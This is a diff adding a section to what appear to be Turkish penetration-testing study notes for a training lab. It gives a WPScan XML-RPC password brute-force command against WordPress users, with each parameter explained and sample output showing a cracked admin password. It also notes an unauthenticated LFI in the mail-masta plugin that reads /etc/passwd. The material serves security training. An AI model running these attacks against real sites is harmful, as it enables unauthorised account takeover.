@@ -571,3 +571,27 @@ WordPress üzerindeki mail-masta eklentisinde tespit edilen kimlik doğrulaması
 - Parametre: pl=
 - Zafiyet Türü: Unauthenticated Local File Inclusion (LFI)
 - Hedef Dosya: /etc/passwd
+
+# 🔓 WPScan ile WordPress Kullanıcı Brute Force Saldırısı
+
+WPScan, WordPress sitelerinde kullanıcı adı ve şifre kaba kuvvet (brute force) saldırıları gerçekleştirmek için kullanılabilir. Daha önceki tarama raporlarında tespit edilen kullanıcılar (admin, roger ve david) bu aşamada hedef alınabilir.
+
+WPScan iki tür giriş brute force saldırısı destekler:
+- wp-login: Normal WordPress giriş sayfasını hedefler.
+- xmlrpc: WordPress API'sini kullanarak istekleri /xmlrpc.php üzerinden gerçekleştirir ve daha hızlı olduğu için tercih edilir.
+
+[XML-RPC Yöntemiyle Brute Force Komutu]
+wpscan --password-attack xmlrpc -t 20 -U admin,david -P passwords.txt --url http://blog.inlanefreight.com
+
+[Parametre Açıklamaları]
+- --password-attack xmlrpc: Saldırı türü olarak daha hızlı olan XML-RPC protokolünün kullanılacağını belirtir.
+- -t 20: Eşzamanlı iş parçacığı (thread) sayısını 20 olarak ayarlar.
+- -U admin,david: Hedef alınacak kullanıcı adlarını virgülle ayırarak belirtir.
+- -P passwords.txt: Denenecek şifrelerin bulunduğu kelime listesi (wordlist) dosyasının yoludur.
+
+[Başarılı Sonuç Çıktısı Örneği]
+[+] Performing password attack on Xmlrpc against 3 user/s
+[SUCCESS] - admin / sunshine1
+Trying david / Spring2016 Time: 00:00:01 <============> (474 / 474) 100.00% Time: 00:00:01
+[i] Valid Combinations Found: 
+| Username: admin, Password: sunshine1
